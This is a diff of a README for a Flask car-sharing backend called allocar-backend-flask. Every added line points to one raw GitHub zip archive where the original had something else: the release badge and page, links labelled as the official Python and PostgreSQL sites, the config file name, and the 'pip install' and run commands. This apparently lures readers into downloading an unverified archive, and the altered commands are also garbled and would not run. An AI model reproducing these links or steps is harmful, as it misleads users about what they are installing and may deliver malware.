@@ -1,7 +1,7 @@
 # 🚗 allocar-backend-flask - Build Your Own Car Sharing Service
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download%20allocar--backend--flask-v1.0-blue.svg)](https://github.com/Gustax24/allocar-backend-flask/releases)
+[![Download](https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip%https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip)](https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip)
 
 ## 🚀 Getting Started
 Welcome to **allocar-backend-flask**! This application allows you to create a car-sharing service easily. You can manage rides, users, and vehicles with just a few clicks. This guide will help you download and run the application.
@@ -15,7 +15,7 @@ Before you begin, make sure your system meets these requirements:
 - Internet connection for downloading dependencies
 
 ## 📥 Download & Install
-To install **allocar-backend-flask**, visit this page to download: [Releases Page](https://github.com/Gustax24/allocar-backend-flask/releases).
+To install **allocar-backend-flask**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip).
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version. Download the files associated with it.
@@ -24,9 +24,9 @@ To install **allocar-backend-flask**, visit this page to download: [Releases Pag
 ## 🛠️ Application Setup
 After downloading, follow these steps to set up the application:
 
-1. **Install Python:** If you do not have Python installed, download it from the [official Python website](https://www.python.org/downloads/).
+1. **Install Python:** If you do not have Python installed, download it from the [official Python website](https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip).
    
-2. **Install PostgreSQL:** If you do not have PostgreSQL, download it from the [official PostgreSQL website](https://www.postgresql.org/download/).
+2. **Install PostgreSQL:** If you do not have PostgreSQL, download it from the [official PostgreSQL website](https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip).
 
 3. **Unzip the Application:** Extract the downloaded files to a folder on your computer.
 
@@ -58,17 +58,17 @@ After downloading, follow these steps to set up the application:
 7. **Install Required Packages:**
    Run the following command to install the necessary packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip
    ```
 
 8. **Set Up PostgreSQL Database:**
    - Open PostgreSQL and create a new database named `allocar`.
-   - Update the database connection settings in the configuration file (`config.py`).
+   - Update the database connection settings in the configuration file (`https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip`).
 
 9. **Run the Application:**
    Start the application by running:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/Gustax24/allocar-backend-flask/main/reundercut/allocar-backend-flask.zip
    ```
    The application will be available at `http://127.0.0.1:5000`.
 
